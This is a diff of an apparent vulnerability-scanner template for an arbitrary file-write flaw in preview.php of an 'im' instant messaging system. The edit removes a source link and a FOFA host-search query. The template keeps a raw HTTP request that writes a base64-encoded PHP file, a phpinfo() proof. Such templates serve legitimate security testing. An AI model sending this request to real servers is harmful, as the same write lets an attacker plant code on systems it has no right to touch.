@@ -3,12 +3,8 @@ info:
   name: im即时通讯系统preview.php前台任意⽂件写⼊漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gkwfbavfc14gzmfs'
+  description: ''
   tags: other,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gkwfbavfc14gzmfs
-    fofa: body="/superloginAction.html" || "im.smiaoshen.com"
 http:
 - raw:
   - 'GET /static/lib/webuploader/0.1.5/server/preview.php HTTP/1.1
@@ -37,10 +33,7 @@ http:
 
     Content-Length: 46
 
-    data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+
-
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1743171026726-e9fafb6b-2d96-4749-b593-80413e62f6ae.png)'
+    data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+'
   redirects: false
   matchers:
   - status:
